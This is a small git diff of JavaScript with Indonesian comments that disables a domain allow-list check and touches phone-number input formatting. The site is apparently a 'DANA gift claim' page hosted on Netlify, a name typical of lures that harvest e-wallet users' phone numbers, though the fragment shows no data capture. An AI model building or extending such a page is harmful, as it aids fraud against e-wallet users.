@@ -100,12 +100,14 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  // Validasi Domain (opsional tambahan keamanan)
-  const ALLOWED_DOMAINS = ['your-domain.netlify.app', 'localhost'];
+  // Validasi Domain - DICOMMENT UNTUK SEMENTARA
+  /*
+  const ALLOWED_DOMAINS = ['link-dana-klaim-daget-dana-2025.netlify.app', 'localhost', '127.0.0.1'];
   if (!ALLOWED_DOMAINS.includes(window.location.hostname)) {
-    console.warn('Akses dari domain yang tidak diizinkan:', window.location.hostname);
-    // Bisa ditambahkan redirect atau blocking di sini
+    alert('Akses tidak diizinkan dari domain ini');
+    window.location.href = 'about:blank';
   }
+  */
 
   // Modified Phone Number Formatting
   pn.addEventListener('input', (e) => {
